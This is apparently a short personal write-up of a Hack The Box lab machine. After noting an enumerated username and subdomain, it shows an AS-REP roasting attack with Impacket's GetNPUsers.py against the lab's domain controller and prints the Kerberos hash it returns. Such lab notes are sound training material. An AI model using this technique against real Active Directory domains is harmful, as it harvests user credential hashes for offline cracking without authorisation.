# Enumeration-

Username- j.nakazawa@realcorp\.htb
Subdomain- srv01.realcorp.htb

**`ACCESS DENIED`**

![[Pasted image 20210626104626.png]]


# AS-REP-ROAST-

With the username, I can try to get a hash off of Kerberos using `GetNPUsers.py`.This will return a hash if the `UF_DONT_REQUIRE_PREAUTH` flag is set for the user. It works:

```bash
root@napster:~/Documents/HTB/Tentacle# GetNPUsers.py -no-pass -dc-ip 10.10.10.224 realcorp.htb/j.nakazawa -outputfile as_rep_roast.hash
Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for j.nakazawa
$krb5asrep$18$j.nakazawa@REALCORP.HTB:451a5111f6c12657436c06890a2299f3$6bef0f93e99be9ee95839d4431d41f7c4a970cfe982ff53b98cac20fad7f16a0de82d00ea312e87f8fbb2e97747de1f1a1006ad18ce0aaa617d29883140f55351dacafa1452fc0e1e7191bbb4a7874f4e3fd8571201af425c9d04ee380fad3717662661b33df5be7f6b671e6a74cc385d2e7c1ff655cd7addbd1fd9985a5b677d845e1ccff5c7fc979ad163ed8e40045eb1434a4a1e698150ce4cf4abf5f1be1dafb3ab650f12f52550daf97a293f0a89958522e021bc2192dcf74a6bcb53cd16863b563cb1715b8d4e33da77cb792045cfe1ee3386b7408221b
```

This type of hash $krb5asrep$18$ can't be cracked by hashcat.